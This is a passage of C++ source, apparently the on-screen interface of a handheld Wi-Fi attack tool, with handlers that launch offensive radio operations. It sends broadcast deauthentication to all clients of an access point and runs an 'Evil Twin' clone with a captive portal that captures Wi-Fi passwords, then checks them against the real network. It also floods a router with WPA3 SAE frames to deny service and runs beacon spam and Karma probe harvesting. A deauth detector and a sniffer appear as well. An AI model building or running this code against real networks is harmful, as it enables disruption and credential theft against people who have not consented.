        domain::has_capability(engine->capabilities(), domain::RadioCapability::StationScan);
    lv_obj_t* scan_clients = make_button(right, LV_SYMBOL_REFRESH " Scan clients", SemanticColor::Accent);
    lv_obj_set_width(scan_clients, lv_pct(100));
    if (can_stations) {
        lv_obj_add_event_cb(scan_clients, &WifiScreen::on_scan_clients, LV_EVENT_CLICKED, this);
    } else {
        lv_obj_add_state(scan_clients, LV_STATE_DISABLED);
    }

    const bool can_beacon =
        engine != nullptr &&
        domain::has_capability(engine->capabilities(), domain::RadioCapability::BeaconSpam);
    lv_obj_t* clone_btn = make_button(right, LV_SYMBOL_COPY " Clone & Spam", SemanticColor::Warning);
    lv_obj_set_width(clone_btn, lv_pct(100));
    if (can_beacon && !ap.hidden && !ap.ssid.empty()) {
        lv_obj_add_event_cb(clone_btn, &WifiScreen::on_clone_spam, LV_EVENT_CLICKED, this);
    } else {
        lv_obj_add_state(clone_btn, LV_STATE_DISABLED);
    }

    // Evil Twin: a real connectable AP with this SSID + captive portal -> creds.
    if (services::has_evil_portal()) {
        lv_obj_t* twin_btn = make_button(right, LV_SYMBOL_WARNING " Evil Twin", SemanticColor::Danger);
        lv_obj_set_width(twin_btn, lv_pct(100));
        if (!ap.hidden && !ap.ssid.empty()) {
            lv_obj_add_event_cb(twin_btn, &WifiScreen::on_evil_twin, LV_EVENT_CLICKED, this);
        } else {
            lv_obj_add_state(twin_btn, LV_STATE_DISABLED);
        }
    }

    // WPA3 SAE Overflow: flood SAE commit frames -> DoS the router (blocks new conns).
    if (can_deauth) {
        lv_obj_t* sae_btn = make_button(
            right, sae_timer_ != nullptr ? LV_SYMBOL_STOP " Stop DoS" : LV_SYMBOL_WARNING " WPA3 DoS",
            SemanticColor::Danger);
        lv_obj_set_width(sae_btn, lv_pct(100));
        sae_lbl_ = lv_obj_get_child(sae_btn, 0);
        lv_obj_add_event_cb(sae_btn, &WifiScreen::on_sae_toggle, LV_EVENT_CLICKED, this);
    }

    // Live results console: deauth / clone / WPA3 rc lines stream here so the
    // detail-view attacks (no modal) show what's happening. Refreshed by on_timer.
    lv_obj_t* cbox = lv_obj_create(right);
    lv_obj_set_width(cbox, lv_pct(100));
    lv_obj_set_height(cbox, 200);
    lv_obj_set_style_bg_color(cbox, lv_semantic(SemanticColor::Background), 0);
    lv_obj_set_style_bg_opa(cbox, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(cbox, 0, 0);
    lv_obj_set_style_pad_all(cbox, tokens::SpaceSm, 0);
    lv_obj_set_scroll_dir(cbox, LV_DIR_VER);
    detail_console_ = lv_label_create(cbox);
    lv_label_set_long_mode(detail_console_, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(detail_console_, lv_pct(100));
    lv_obj_set_style_text_font(detail_console_, &ibm_plex_mono_16, 0);
    lv_obj_set_style_text_color(detail_console_, lv_semantic(SemanticColor::TextSecondary), 0);
    const std::string c0 = services::RadioConsole::instance().text();
    lv_label_set_text(detail_console_, c0.empty() ? "(attack output appears here)" : c0.c_str());
    detail_console_rev_ = services::RadioConsole::instance().revision();
}

void WifiScreen::on_row_selected(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr || self->table_ == nullptr) {
        return;
    }
    uint32_t row = LV_TABLE_CELL_NONE;
    uint32_t col = LV_TABLE_CELL_NONE;
    lv_table_get_selected_cell(self->table_, &row, &col);
    if (row == LV_TABLE_CELL_NONE || row == 0) {
        return;
    }
    const std::size_t idx = row - 1;
    if (idx >= self->filtered_.size()) {
        return;
    }
    // Building the detail view cleans body_, which deletes table_ -- the very
    // object whose press LVGL is still dispatching. Doing that here leaves the
    // input device holding a dangling pointer that crashes on the next touch
    // (e.g. pressing Scan). Capture a copy of the AP, mark detail mode now so
    // the refresh timer stops rebuilding the list, and defer the actual swap to
    // an async call that runs once LVGL has finished with this input event.
    self->pending_detail_ = self->filtered_[idx];
    self->in_detail_      = true;
    lv_async_call(&WifiScreen::on_show_detail_async, self);
}

void WifiScreen::on_show_detail_async(void* user_data)
{
    auto* self = static_cast<WifiScreen*>(user_data);
    if (self != nullptr && self->in_detail_) {
        self->show_detail(self->pending_detail_);
    }
}

void WifiScreen::on_back_clicked(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr) {
        return;
    }
    // Same hazard as on_row_selected: this runs inside the Back button's CLICKED
    // event, and rebuilding the list cleans body_ -- which deletes that very
    // button. Mark detail mode off now (so the timer can resume) and defer the
    // teardown/rebuild until LVGL has finished dispatching this event.
    self->in_detail_ = false;
    lv_async_call(&WifiScreen::on_exit_detail_async, self);
}

void WifiScreen::on_exit_detail_async(void* user_data)
{
    auto* self = static_cast<WifiScreen*>(user_data);
    if (self == nullptr || self->in_detail_) {
        return;  // re-entered detail before this fired
    }
    self->close_attack_modal();
    // Back to the AP list: restore the list chrome hidden by show_detail().
    for (lv_obj_t* o : {self->header_, self->metrics_, self->filters_row_, self->search_row_}) {
        if (o != nullptr) {
            lv_obj_clear_flag(o, LV_OBJ_FLAG_HIDDEN);
        }
    }
    self->table_ = nullptr;
    self->last_sig_.clear();
    lv_obj_clean(self->body_);
    lv_obj_set_style_pad_row(self->body_, 0, 0);
    self->rebuild_list();
}

void WifiScreen::send_deauth_once()
{
    auto* engine = services::radio_engine();
    if (engine == nullptr) {
        return;
    }
    domain::MacAddr bssid{};
    if (!parse_mac(pending_detail_.bssid, bssid)) {
        return;
    }
    domain::DeauthParams params;
    params.bssid   = bssid;
    params.target  = {0, 0, 0, 0, 0, 0};  // broadcast = deauth all clients of the AP
    params.channel = static_cast<uint8_t>(pending_detail_.channel);
    params.reason  = 7;
    params.bursts  = 8;
    engine->send(domain::cmd_deauth(params));
    services::ActivityStats::instance().deauth_frames.fetch_add(params.bursts);
}

void WifiScreen::on_attack_open(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr) {
        self->monitor_mode_ = false;
        self->portal_mode_  = false;
        self->open_attack_modal();
    }
}

void WifiScreen::on_portal_open(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr) {
        self->monitor_mode_ = false;
        self->portal_mode_  = true;
        self->twin_ssid_.clear();  // header button = generic "Free WiFi" portal
        self->open_attack_modal();
    }
}

void WifiScreen::on_evil_twin(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr || self->pending_detail_.hidden || self->pending_detail_.ssid.empty()) {
        return;
    }
    // Impersonate this AP via the captive portal. Use the proven portal-modal path
    // (flip the switch to start) rather than starting here -- kicking off the portal
    // worker while the scanner is mid-scan races on the Wi-Fi netif and crashes.
    self->twin_ssid_    = self->pending_detail_.ssid;
    self->twin_channel_ = static_cast<uint8_t>(self->pending_detail_.channel);
    parse_mac(self->pending_detail_.bssid, self->twin_bssid_);  // for the optional deauth
    self->monitor_mode_ = false;
    self->portal_mode_  = true;
    // Clone on the real AP's channel so a parallel deauth can coexist with the SoftAP.
    if (auto* portal = services::evil_portal()) {
        portal->set_ap_channel(self->twin_channel_);
    }
    self->open_attack_modal();
}

void WifiScreen::on_twin_deauth_toggle(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* btn  = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    if (self == nullptr || btn == nullptr) {
        return;
    }
    lv_obj_t* lbl = lv_obj_get_child(btn, 0);
    if (self->twin_deauth_timer_ != nullptr) {
        lv_timer_del(self->twin_deauth_timer_);
        self->twin_deauth_timer_ = nullptr;
        if (lbl != nullptr) {
            lv_label_set_text(lbl, LV_SYMBOL_WARNING " Deauth: OFF");
        }
    } else {
        self->twin_deauth_timer_ = lv_timer_create(&WifiScreen::on_twin_deauth_timer, 400, self);
        if (lbl != nullptr) {
            lv_label_set_text(lbl, LV_SYMBOL_WARNING " Deauth: ON");
        }
    }
}

void WifiScreen::on_template_changed(lv_event_t* event)
{
    auto* self   = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* dd     = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    auto* portal = services::evil_portal();
    if (self == nullptr || dd == nullptr || portal == nullptr) {
        return;
    }
    // 0 Built-in, 1 Router (offline), 2 Login (offline), 3+ SD files.
    const uint16_t sel = lv_dropdown_get_selected(dd);
    if (sel == 0) {
        portal->set_template_html("");
        portal->set_template("");
    } else if (sel == 1) {
        portal->set_template("");
        portal->set_template_html(kBuiltinRouter);
    } else if (sel == 2) {
        portal->set_template("");
        portal->set_template_html(kBuiltinLogin);
    } else if (static_cast<std::size_t>(sel - 3) < self->template_paths_.size()) {
        portal->set_template_html("");
        portal->set_template(self->template_paths_[sel - 3]);
    }
}

void WifiScreen::on_twin_deauth_timer(lv_timer_t* timer)
{
    auto* self   = static_cast<WifiScreen*>(lv_timer_get_user_data(timer));
    auto* engine = services::radio_engine();
    if (self == nullptr || engine == nullptr) {
        return;
    }
    // Boot the victims off the real AP so they fall onto the open clone.
    domain::DeauthParams p;
    p.bssid   = self->twin_bssid_;
    p.target  = {0, 0, 0, 0, 0, 0};  // broadcast = all clients
    p.channel = self->twin_channel_;
    p.reason  = 7;
    p.bursts  = 6;
    engine->send(domain::cmd_deauth(p));
    services::ActivityStats::instance().deauth_frames.fetch_add(p.bursts);
}

void WifiScreen::on_sae_toggle(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr) {
        return;
    }
    if (self->sae_timer_ != nullptr) {
        lv_timer_del(self->sae_timer_);
        self->sae_timer_ = nullptr;
        if (self->sae_lbl_ != nullptr) {
            lv_label_set_text(self->sae_lbl_, LV_SYMBOL_WARNING " WPA3 DoS");
        }
        if (auto* sc = services::wifi_scanner()) {
            sc->start();  // resume scanning
        }
        self->set_status("WPA3 SAE flood stopped.");
        return;
    }
    if (!parse_mac(self->pending_detail_.bssid, self->sae_bssid_)) {
        self->set_status("No BSSID to target.");
        return;
    }
    self->sae_channel_ = static_cast<uint8_t>(self->pending_detail_.channel);
    // Mirror the beacon flood: warm up ~3s, then halt scan hopping so the flood stays
    // on the AP's channel AND the scanner's SDIO traffic stops contending with ours
    // (running both wedges the hosted link -> host reset after ~10s).
    self->sae_warmup_ = 10;
    self->sae_timer_  = lv_timer_create(&WifiScreen::on_sae_timer, 300, self);
    if (self->sae_lbl_ != nullptr) {
        lv_label_set_text(self->sae_lbl_, LV_SYMBOL_STOP " Stop DoS");
    }
    self->set_status("WPA3 SAE flood ON: exhausting the router's SAE state table.");
}

void WifiScreen::on_verify_pwd(lv_event_t* event)
{
    auto* self   = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* portal = services::evil_portal();
    if (self == nullptr || portal == nullptr) {
        return;
    }
    if (portal->last_password().empty()) {
        if (self->attack_status_ != nullptr) {
            lv_label_set_text(self->attack_status_, "No password captured yet -- wait for a victim.");
        }
        return;
    }
    portal->verify_last();  // drops the AP, STA-connects to the real AP, result -> console
    if (self->attack_status_ != nullptr) {
        lv_label_set_text(self->attack_status_,
                          LV_SYMBOL_REFRESH " Verifying against the real AP... (portal drops)");
    }
}

void WifiScreen::on_sae_timer(lv_timer_t* timer)
{
    auto* self   = static_cast<WifiScreen*>(lv_timer_get_user_data(timer));
    auto* engine = services::radio_engine();
    if (self == nullptr || engine == nullptr) {
        return;
    }
    if (self->sae_warmup_ > 0) {
        --self->sae_warmup_;
        if (self->sae_warmup_ == 0) {
            if (auto* sc = services::wifi_scanner()) {
                sc->stop();  // hold the AP channel + free the SDIO link for the flood
            }
        }
        if (self->sae_lbl_ != nullptr) {
            lv_label_set_text(self->sae_lbl_, LV_SYMBOL_REFRESH " Arming...");
        }
        return;
    }
    if (self->sae_lbl_ != nullptr) {
        lv_label_set_text(self->sae_lbl_, LV_SYMBOL_STOP " Stop DoS");
    }
    engine->send(domain::cmd_sae_flood(self->sae_bssid_, self->sae_channel_));
}

namespace {
const char* const kFunnyNames[] = {
    "FBI Surveillance Van",     "Free WiFi",         "Pretty Fly for a WiFi", "Tell My WiFi Love Her",
    "Drop It Like Its Hotspot", "Loading...",        "VIRUS.exe",             "It Hurts When IP",
    "The Promised LAN",         "Wu-Tang LAN",       "Slave I",               "Mom Click Here",
    "404 Network Not Found",    "No Free WiFi Here", "Hide Yo WiFi",          "NSA Listening Post",
};
constexpr int kFunnyCount             = static_cast<int>(sizeof(kFunnyNames) / sizeof(kFunnyNames[0]));
const char* const kSpamModeLabels[4]  = {"Funny", "Random", "Karma", "SD list"};
constexpr int kSpamModeCount          = 4;

// Load beacon-spam SSIDs from the SD card (one per line, max 64).
std::vector<std::string> load_sd_ssids()
{
    std::vector<std::string> out;
    FILE* f = std::fopen("/sd/spectra5/ssids.txt", "r");
    if (f == nullptr) {
        return out;
    }
    char line[64];
    while (std::fgets(line, sizeof(line), f) != nullptr && out.size() < 64) {
        std::string s(line);
        while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' ')) {
            s.pop_back();
        }
        if (!s.empty()) {
            out.push_back(s);
        }
    }
    std::fclose(f);
    return out;
}

// Captive-portal HTML templates the user drops on the SD card. Returns full paths;
// each file may use {SSID} as a placeholder for the cloned network name.
std::vector<std::string> list_portal_templates()
{
    std::vector<std::string> out;
    const char* dir = "/sd/spectra5/portals";
    DIR* d          = opendir(dir);
    if (d == nullptr) {
        return out;
    }
    for (struct dirent* e = readdir(d); e != nullptr; e = readdir(d)) {
        const std::string name = e->d_name;
        if (name.size() > 5 && name.substr(name.size() - 5) == ".html") {
            out.push_back(std::string(dir) + "/" + name);
        }
    }
    closedir(d);
    std::sort(out.begin(), out.end());
    return out;
}
}  // namespace

void WifiScreen::on_beacon_clicked(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr) {
        self->open_spam_modal();
    }
}

void WifiScreen::on_detect_toggle(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr) {
        self->open_radio_monitor(1);  // deauth detector terminal
    }
}

void WifiScreen::on_sniff_toggle(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr) {
        self->open_radio_monitor(2);  // live sniffer terminal
    }
}

// Terminal window for the detector / sniffer: starts the mode, shows live output,
// and stops it when closed. kind: 1 = deauth detector, 2 = live sniffer.
void WifiScreen::open_radio_monitor(int kind)
{
    if (monitor_modal_ != nullptr) {
        return;
    }
    auto* engine = services::radio_engine();
    if (engine == nullptr) {
        return;
    }
    monitor_kind_  = kind;
    monitor_rev_   = 0;
    sniff_channel_ = 0;  // default: hop all channels
    sniff_hop_     = 0;
    if (kind == 1) {
        services::DeauthDetector::instance().reset();
    } else if (kind == 2) {
        services::SnifferStore::instance().reset();
    }
    if (auto* sc = services::wifi_scanner()) {
        sc->stop();  // the C6 radio is needed exclusively for promiscuous / 802.15.4
    }
    if (kind == 1) {
        engine->send(domain::cmd_start_detect());
    } else if (kind == 2) {
        engine->send(domain::cmd_start_sniff(1));
    } else {
        engine->send(domain::cmd_zigbee_scan());  // one-shot energy scan
    }
    detect_active_ = (kind == 1);
    sniff_active_  = (kind == 2);

    monitor_modal_ = lv_obj_create(lv_layer_top());
    lv_obj_set_size(monitor_modal_, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(monitor_modal_, lv_color_black(), 0);
    lv_obj_set_style_bg_opa(monitor_modal_, LV_OPA_70, 0);
    lv_obj_set_style_border_width(monitor_modal_, 0, 0);
    lv_obj_clear_flag(monitor_modal_, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(monitor_modal_, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(monitor_modal_, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER,
                          LV_FLEX_ALIGN_CENTER);

    lv_obj_t* panel = lv_obj_create(monitor_modal_);
    lv_obj_set_size(panel, lv_pct(86), lv_pct(86));
    lv_obj_set_style_bg_color(panel, lv_semantic(SemanticColor::Surface), 0);
    lv_obj_set_style_radius(panel, tokens::RadiusMd, 0);
    lv_obj_set_style_pad_all(panel, tokens::SpaceLg, 0);
    lv_obj_set_style_pad_row(panel, tokens::SpaceMd, 0);
    lv_obj_set_flex_flow(panel, LV_FLEX_FLOW_COLUMN);
    lv_obj_clear_flag(panel, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t* hdr = make_panel(panel, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(hdr, lv_pct(100));
    lv_obj_set_height(hdr, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_column(hdr, tokens::SpaceMd, 0);
    lv_obj_set_flex_align(hdr, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t* title = lv_label_create(hdr);
    lv_label_set_text(title, kind == 1   ? LV_SYMBOL_EYE_OPEN " Deauth Detector"
                             : kind == 2 ? LV_SYMBOL_LIST " Live Sniffer"
                                         : LV_SYMBOL_GPS " 802.15.4 Energy (Zigbee/Thread)");
    lv_obj_set_style_text_color(title, lv_semantic(SemanticColor::TextPrimary), 0);
    lv_obj_set_style_text_font(title, &ibm_plex_mono_32, 0);
    lv_obj_set_flex_grow(title, 1);
    lv_obj_t* close = make_button(hdr, LV_SYMBOL_CLOSE " Close", SemanticColor::Border);
    lv_obj_add_event_cb(close, &WifiScreen::on_monitor_close, LV_EVENT_CLICKED, this);

    monitor_stats_ = lv_label_create(panel);
    lv_obj_set_width(monitor_stats_, lv_pct(100));
    lv_label_set_text(monitor_stats_, kind == 1 ? "Deauth/disassoc frames: 0"
                                                : "Listening...");
    lv_obj_set_style_text_color(monitor_stats_, lv_semantic(SemanticColor::Accent), 0);
    lv_obj_set_style_text_font(monitor_stats_, &ibm_plex_mono_18, 0);

    // Sniffer: channel picker -- All (hop 1..13) or a fixed channel.
    if (kind == 2) {
        lv_obj_t* crow = make_panel(panel, LV_FLEX_FLOW_ROW);
        lv_obj_set_width(crow, lv_pct(100));
        lv_obj_set_height(crow, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_column(crow, tokens::SpaceMd, 0);
        lv_obj_set_flex_align(crow, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER,
                              LV_FLEX_ALIGN_CENTER);
        lv_obj_t* clbl = lv_label_create(crow);
        lv_label_set_text(clbl, "Channel:");
        lv_obj_set_style_text_color(clbl, lv_semantic(SemanticColor::TextSecondary), 0);
        lv_obj_t* cdd = lv_dropdown_create(crow);
        lv_dropdown_set_options(cdd, "All (hop)\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13");
        lv_obj_set_width(cdd, 150);
        brand_input(cdd);
        lv_obj_add_event_cb(cdd, &WifiScreen::on_sniff_channel, LV_EVENT_VALUE_CHANGED, this);
    }

    lv_obj_t* cbox = lv_obj_create(panel);
    lv_obj_set_width(cbox, lv_pct(100));
    lv_obj_set_flex_grow(cbox, 1);
    lv_obj_set_style_bg_color(cbox, lv_semantic(SemanticColor::Background), 0);
    lv_obj_set_style_bg_opa(cbox, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(cbox, 0, 0);
    lv_obj_set_style_pad_all(cbox, tokens::SpaceSm, 0);
    lv_obj_set_scroll_dir(cbox, LV_DIR_VER);
    monitor_console_ = lv_label_create(cbox);
    lv_label_set_long_mode(monitor_console_, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(monitor_console_, lv_pct(100));
    lv_obj_set_style_text_font(monitor_console_, &ibm_plex_mono_16, 0);
    lv_obj_set_style_text_color(monitor_console_, lv_semantic(SemanticColor::TextSecondary), 0);
    lv_label_set_text(monitor_console_, "(listening...)");

    monitor_timer_ = lv_timer_create(&WifiScreen::on_monitor_timer, 300, this);
}

void WifiScreen::on_sniff_channel(lv_event_t* event)
{
    auto* self   = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* dd     = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    auto* engine = services::radio_engine();
    if (self == nullptr || dd == nullptr || engine == nullptr) {
        return;
    }
    services::SnifferStore::instance().reset();  // fresh counts for the new channel
    const uint16_t sel = lv_dropdown_get_selected(dd);  // 0 = All, 1..13 = channel
    self->sniff_channel_ = sel;                          // sel maps directly (0 all, N=channel)
    if (sel != 0) {
        engine->send(domain::cmd_set_channel(static_cast<uint8_t>(sel)));
    }
}

void WifiScreen::on_monitor_timer(lv_timer_t* timer)
{
    auto* self = static_cast<WifiScreen*>(lv_timer_get_user_data(timer));
    if (self == nullptr) {
        return;
    }
    // Sniffer in "All" mode: hop 1..13 so we see traffic on every channel.
    if (self->monitor_kind_ == 2 && self->sniff_channel_ == 0) {
        if (auto* engine = services::radio_engine()) {
            engine->send(domain::cmd_set_channel(static_cast<uint8_t>(1 + (self->sniff_hop_ % 13))));
            ++self->sniff_hop_;
        }
    }
    if (self->monitor_stats_ != nullptr) {
        char b[120];
        if (self->monitor_kind_ == 1) {
            std::snprintf(b, sizeof(b), LV_SYMBOL_WARNING " Deauth/disassoc frames: %u",
                          static_cast<unsigned>(services::DeauthDetector::instance().count()));
        } else if (self->monitor_kind_ == 3) {
            std::snprintf(b, sizeof(b), services::ZigbeeStore::instance().has_result()
                                            ? "Channels 11-26 (higher = busier):"
                                            : "Scanning 802.15.4 channels...");
        } else {
            const auto c = services::SnifferStore::instance().snapshot();
            char ch[12];
            if (self->sniff_channel_ == 0) {
                std::snprintf(ch, sizeof(ch), "ch %d", 1 + ((self->sniff_hop_ - 1 + 13) % 13));
            } else {
                std::snprintf(ch, sizeof(ch), "ch %d", self->sniff_channel_);
            }
            std::snprintf(b, sizeof(b), "[%s] B%u P%u D%u Dx%u O%u",
                          self->sniff_channel_ == 0 ? "hop" : ch, static_cast<unsigned>(c[0]),
                          static_cast<unsigned>(c[1]), static_cast<unsigned>(c[2]),
                          static_cast<unsigned>(c[3]), static_cast<unsigned>(c[4]));
        }
        lv_label_set_text(self->monitor_stats_, b);
    }
    if (self->monitor_console_ != nullptr) {
        if (self->monitor_kind_ == 3) {
            // Energy bars per 802.15.4 channel (11..26).
            const uint32_t rev = services::ZigbeeStore::instance().revision();
            if (rev != self->monitor_rev_) {
                self->monitor_rev_ = rev;
                const auto p       = services::ZigbeeStore::instance().snapshot();
                std::string t;
                for (int i = 0; i < 16; ++i) {
                    char line[64];
                    const int bars = (p[i] + 100) / 5;  // ~-100..0 dBm -> 0..20
                    std::string bar(bars < 0 ? 0 : (bars > 20 ? 20 : bars), '#');
                    std::snprintf(line, sizeof(line), "ch %2d  %4d dBm  %s\n", 11 + i,
                                  static_cast<int>(p[i]), bar.c_str());
                    t += line;
                }
                lv_label_set_text(self->monitor_console_,
                                  services::ZigbeeStore::instance().has_result()
                                      ? t.c_str()
                                      : "(scanning... ~1s)");
            }
        } else {
            const uint32_t rev = services::RadioConsole::instance().revision();
            if (rev != self->monitor_rev_) {
                self->monitor_rev_  = rev;
                const std::string t = services::RadioConsole::instance().text();
                lv_label_set_text(self->monitor_console_, t.empty() ? "(listening...)" : t.c_str());
            }
        }
    }
}

void WifiScreen::on_monitor_close(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr) {
        return;
    }
    if (self->monitor_timer_ != nullptr) {
        lv_timer_del(self->monitor_timer_);
        self->monitor_timer_ = nullptr;
    }
    if (auto* engine = services::radio_engine()) {
        engine->send(domain::cmd_stop());
    }
    if (auto* sc = services::wifi_scanner()) {
        sc->start();  // resume scanning
    }
    self->detect_active_ = false;
    self->sniff_active_  = false;
    lv_obj_t* m            = self->monitor_modal_;
    self->monitor_modal_   = nullptr;
    self->monitor_console_ = nullptr;
    self->monitor_stats_   = nullptr;
    if (m != nullptr) {
        lv_obj_del_async(m);
    }
}

void WifiScreen::on_beacon_timer(lv_timer_t* timer)
{
    auto* self   = static_cast<WifiScreen*>(lv_timer_get_user_data(timer));
    auto* engine = services::radio_engine();
    if (self == nullptr || engine == nullptr) {
        return;
    }
    // Hold off while the C6 radio hand-off (BLE -> Wi-Fi reset) settles. Sending
    // over the re-initialising SDIO link wedges the host driver -> reboot.
    if (self->beacon_warmup_ > 0) {
        --self->beacon_warmup_;
        if (self->beacon_warmup_ == 0) {
            // Hand-off settled: halt scan hopping so our beacons stay on a stable
            // channel (otherwise the scanner sweeps channels and victims never
            // dwell on ours -- frames go out, but nothing shows up in their list).
            if (auto* scanner = services::wifi_scanner()) {
                scanner->stop();
            }
            // Karma: also start the C6 probe-request harvest on channel 1.
            if (self->beacon_mode_ == 2) {
                engine->send(domain::cmd_start_karma(1));
            }
        }
        if (self->spam_status_ != nullptr) {
            lv_label_set_text(self->spam_status_, LV_SYMBOL_REFRESH " Arming radio...");
        }
        return;
    }
    // Build a batch of SSIDs; the C6 emits each on the command's channel (the P4
    // rotates 1/6/11) so the spam is dense and visible without flooding the SDIO.
    constexpr int kBatch = 6;
    std::vector<std::string> batch;
    batch.reserve(kBatch);
    // Karma: beacon the SSIDs harvested from nearby probe requests.
    std::vector<std::string> karma;
    if (self->beacon_mode_ == 2 && self->clone_ssid_.empty()) {
        karma = services::ProbeStore::instance().snapshot();
    }
    for (int k = 0; k < kBatch; ++k) {
        const uint32_t n = self->beacon_count_ + static_cast<uint32_t>(k);
        if (!self->clone_ssid_.empty()) {
            batch.push_back(self->clone_ssid_);  // impersonate one specific AP
        } else if (self->beacon_mode_ == 3) {
            if (self->sd_ssids_.empty()) {
                break;  // no /sd/spectra5/ssids.txt
            }
            batch.push_back(self->sd_ssids_[n % self->sd_ssids_.size()]);
        } else if (self->beacon_mode_ == 2) {
            if (karma.empty()) {
                break;  // nothing harvested yet
            }
            batch.push_back(karma[n % karma.size()]);
        } else if (self->beacon_mode_ == 1) {
            const uint32_t h = (n + 1) * 2654435761u;
            char buf[24];
            std::snprintf(buf, sizeof(buf), "Net_%04X_%02X",
                          static_cast<unsigned>((h >> 16) & 0xFFFF),
                          static_cast<unsigned>(h & 0xFF));
            batch.emplace_back(buf);
        } else {
            batch.emplace_back(kFunnyNames[n % kFunnyCount]);
        }
    }
    if (batch.empty()) {
        if (self->spam_status_ != nullptr) {
            if (self->beacon_mode_ == 2) {
                // Karma v2: hop 1/6/11 while listening so we harvest probes on the
                // channels phones scan, instead of being stuck on the start channel.
                static const uint8_t kHop[3] = {1, 6, 11};
                engine->send(domain::cmd_set_channel(kHop[self->karma_hop_ % 3]));
                ++self->karma_hop_;
                char line[64];
                std::snprintf(line, sizeof(line),
                              LV_SYMBOL_EYE_OPEN " Karma: listening (%u harvested)",
                              static_cast<unsigned>(services::ProbeStore::instance().size()));
                lv_label_set_text(self->spam_status_, line);
            } else if (self->beacon_mode_ == 3) {
                lv_label_set_text(self->spam_status_,
                                  "No SSIDs -- add /sd/spectra5/ssids.txt (one per line).");
            }
        }
        return;
    }
    // Rotate across the channels phones dwell on; one channel per command keeps the
    // C6 light (no per-command channel thrash that wedges the hosted SDIO link).
    static const uint8_t kChans[3] = {1, 6, 11};
    const uint8_t channel          = kChans[(self->beacon_count_ / kBatch) % 3];
    self->beacon_count_ += static_cast<uint32_t>(batch.size());
    engine->send(domain::cmd_beacon(batch, channel));
    services::ActivityStats::instance().beacon_frames.fetch_add(
        static_cast<uint32_t>(batch.size()));

    if (self->spam_status_ != nullptr) {
        char line[64];
        std::snprintf(line, sizeof(line), LV_SYMBOL_WARNING " Beacons emitted: %u",
                      static_cast<unsigned>(self->beacon_count_));
        lv_label_set_text(self->spam_status_, line);
    }
    if (self->spam_console_ != nullptr) {
        const uint32_t rev = services::RadioConsole::instance().revision();
        if (rev != self->spam_console_rev_) {
            self->spam_console_rev_ = rev;
            const std::string c     = services::RadioConsole::instance().text();
            lv_label_set_text(self->spam_console_, c.empty() ? "(idle)" : c.c_str());
        }
    }
}

void WifiScreen::update_spam_modes()
{
    for (int i = 0; i < kSpamModeCount; ++i) {
        if (spam_mode_btns_[i] == nullptr) {
            continue;
        }
        const bool active = (i == beacon_mode_);
        lv_obj_set_style_border_color(
            spam_mode_btns_[i],
            lv_semantic(active ? SemanticColor::Accent : SemanticColor::Border), 0);
        lv_obj_set_style_border_width(spam_mode_btns_[i], active ? 3 : 1, 0);
    }
}

void WifiScreen::on_spam_mode(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* btn  = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    if (self == nullptr || btn == nullptr) {
        return;
    }
    self->beacon_mode_ = static_cast<int>(reinterpret_cast<intptr_t>(lv_obj_get_user_data(btn)));
    self->update_spam_modes();
}

void WifiScreen::on_spam_toggle(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* sw   = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    if (self == nullptr || sw == nullptr) {
        return;
    }
    const bool on = lv_obj_has_state(sw, LV_STATE_CHECKED);
    if (on) {
        self->clone_ssid_.clear();  // modal switch uses the selected mode, not a single clone
        self->start_beacon_spam();
        if (self->spam_status_ != nullptr) {
            lv_label_set_text(self->spam_status_, LV_SYMBOL_REFRESH " Arming radio...");
        }
    } else {
        self->stop_beacon_spam();
        if (self->spam_status_ != nullptr) {
            lv_label_set_text(self->spam_status_, "Stopped.");
        }
    }
}

void WifiScreen::start_beacon_spam()
{
    if (beacon_timer_ != nullptr) {
        return;  // already running (clone_ssid_ changes take effect on the next tick)
    }
    if (auto* scanner = services::wifi_scanner()) {
        scanner->start();  // ensure the C6 radio is up so 80211_tx works
    }
